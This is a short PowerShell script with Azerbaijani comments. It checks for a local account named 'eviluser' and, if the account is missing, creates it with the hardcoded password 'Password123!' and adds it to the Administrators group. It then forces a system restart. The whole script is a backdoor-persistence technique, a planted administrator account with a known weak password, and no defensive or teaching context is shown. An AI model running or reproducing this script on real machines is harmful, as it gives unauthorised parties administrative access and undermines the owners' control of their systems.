# "eviluser" adlı istifadəçinin olub-olmadığını yoxla
$user = Get-LocalUser -Name "eviluser" -ErrorAction SilentlyContinue

if ($user) {
    # Əgər "eviluser" varsa, yalnız yenidən başlat
    Write-Output "'eviluser' istifadəçisi mövcuddur. Sistemi yenidən başlat."
} else {
    # Əgər "eviluser" yoxdursa, onu əlavə et
    New-LocalUser -Name "eviluser" -Password (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -FullName "Evil User" -Description "This is an evil user"
    Add-LocalGroupMember -Group "Administrators" -Member "eviluser"
    Write-Output "'eviluser' istifadəçisi əlavə edildi və administratorlar qrupuna əlavə edildi. Sistemi yenidən başlat."
}

# Sistemi yenidən başlat
Restart-Computer
